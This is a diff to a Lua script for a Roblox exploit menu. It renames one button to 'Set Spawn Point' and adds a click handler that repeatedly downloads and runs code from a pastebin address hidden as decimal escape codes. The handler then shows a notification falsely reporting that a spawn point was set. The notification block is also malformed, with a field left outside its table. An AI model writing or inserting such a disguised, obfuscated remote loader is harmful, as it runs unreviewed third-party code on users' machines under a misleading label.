@@ -263,12 +263,21 @@ EXPLOIT7.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
 EXPLOIT7.Position = UDim2.new(0.0323741436, 0, 0.64, 0)
 EXPLOIT7.Size = UDim2.new(0, 70, 0, 32)
 EXPLOIT7.Font = Enum.Font.Gotham
-EXPLOIT7.Text = "Soon"
+EXPLOIT7.Text = "Set Spawn Point"
 EXPLOIT7.TextColor3 = Color3.fromRGB(255, 255, 255)
 EXPLOIT7.TextScaled = true
 EXPLOIT7.TextSize = 14.000
 EXPLOIT7.TextWrapped = true
 EXPLOIT7.MouseButton1Down:connect(function()
+while wait() do
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\65\48\115\97\100\105\120\10"))()
+end
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Script:";
+	Text = "Successfully Executed Set Spawn Point!";
+	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
+Duration = 16;
 end)
 
 UICorner_17.Parent = EXPLOIT7
